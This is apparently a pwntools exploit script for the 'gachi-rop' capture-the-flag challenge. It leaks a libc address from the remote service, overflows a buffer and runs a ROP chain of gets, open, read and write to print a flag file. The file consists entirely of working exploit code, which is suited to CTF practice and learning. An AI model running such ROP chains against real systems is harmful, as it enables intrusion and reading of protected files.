from pwn import *

elf = ELF('./gachi-rop')
libc = ELF('./libc.so.6')
#io = process(elf.path)
io = remote('gachi-rop.beginners.seccon.games', 4567)
context.binary = elf

io.recvuntil(b'system@')
system_addr = int(io.recvline().strip(), 16)
log.info(f'system address: {hex(system_addr)}')

libc.address = system_addr - libc.symbols['system']
log.info(f'libc base address: {hex(libc.address)}')

libc_pop_rdi = 0x2a3e5
libc_pop_rsi = 0x2be51
libc_pop_rdx_pop_r12 = 0x11f2e7
libc_pop_rax = 0x45eb0
libc_syscall = 0x140e2b
ret_addr = 0x40101a
libc_ret_addr = 0x29139
flag_addr = 0x404060
offset = 24

payload = b'a' * offset
payload += p64(libc_pop_rdi + libc.address)
payload += p64(flag_addr)
payload += p64(libc.symbols['gets'])

payload += p64(libc_pop_rdi + libc.address)
payload += p64(flag_addr)
payload += p64(libc_pop_rsi + libc.address)
payload += p64(0)
payload += p64(ret_addr)
payload += p64(libc.symbols['open'])
payload += p64(ret_addr)

payload += p64(libc_pop_rdi + libc.address)
payload += p64(3)
payload += p64(libc_pop_rsi + libc.address)
payload += p64(flag_addr)
payload += p64(libc_pop_rdx_pop_r12 + libc.address)
payload += p64(0x50)
payload += p64(0)
payload += p64(ret_addr)
payload += p64(libc.symbols['read'])
payload += p64(ret_addr)

payload += p64(libc_pop_rdi + libc.address)
payload += p64(1)
payload += p64(libc_pop_rsi + libc.address)
payload += p64(flag_addr)
payload += p64(libc_pop_rdx_pop_r12 + libc.address)
payload += p64(0x50)
payload += p64(0)
payload += p64(ret_addr)
payload += p64(libc.symbols['write'])
payload += p64(ret_addr)

payload += p64(elf.symbols['main'])
io.sendlineafter(b'Name: ', payload)
io.sendline(b'ctf4b/flag-40ff81b29993c8fc02dbf404eddaf143.txt')
io.interactive()


